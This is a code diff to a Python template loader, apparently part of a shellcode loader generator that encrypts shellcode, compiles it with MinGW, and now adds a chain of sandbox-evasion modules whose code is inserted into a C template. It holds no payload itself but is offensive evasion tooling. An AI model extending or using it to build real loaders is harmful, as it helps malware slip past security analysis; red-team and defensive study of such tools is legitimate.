@@ -2,6 +2,7 @@
 
 from core.config.config import Config
 from core.controlers.EncryptorsChain import EncryptorsChain
+from core.controlers.SandboxEvasionChain import SandboxEvasionChain
 from core.controlers.ShellcodeControler import ShellcodeControler
 from core.controlers.CompilerControler import CompilerControler
 import shutil
@@ -17,6 +18,7 @@ class TemplateLoader:
         self.code_components = []
         self.include_components = []
         self.define_components = []
+        self.sandboxevasion_components = []
         self.mingw_options = []
 
         self.build_options = ""
@@ -25,6 +27,8 @@ class TemplateLoader:
         self.copy_new_template_file()
         #Load encryptors chain
         self.load_encryptors_chain()
+        #Load sandboxEvasion chain
+        self.load_sandboxEvasion_chain()
         #Get Build options
         self.get_build_options()
 
@@ -56,6 +60,15 @@ class TemplateLoader:
                 self.include_components.append(encryptor_module.include_components)
                 self.define_components.append(encryptor_module.define_components)
                 self.mingw_options.append(encryptor_module.mingw_options)
+
+
+    def load_sandboxEvasion_chain(self):
+        self.sandboxEvasion_chain = SandboxEvasionChain.from_list(self.sandbox_evasion)
+        if self.sandboxEvasion_chain:
+            for key, sandboxevasion in self.sandboxEvasion_chain.chain.items():
+                sandboxEvasion_module = sandboxevasion.translate()
+                self.sandboxevasion_components.append(sandboxEvasion_module.sandboxevasion_components)
+
 
     def write_code(self):
         with open(self.template_file, "r") as template_file:
@@ -91,7 +104,13 @@ class TemplateLoader:
         #shellcodeControler.test()
         template_content = template_content.replace(shellcode_placeholder,shellcodeControler.get_encrypted_shellcode_c())
 
-        # Replace Anti-Debug
+        # Replace SandboxEvasion
+        sandboxevasion_placeholder = Config().get('PLACEHOLDERS', 'SANDBOXEVASION')
+        sandboxevasion_components_code = ""
+        for component in self.sandboxevasion_components:
+            if component :
+                sandboxevasion_components_code += component.code
+        template_content = template_content.replace(sandboxevasion_placeholder,sandboxevasion_components_code)       
 
         # Replace Delay
 
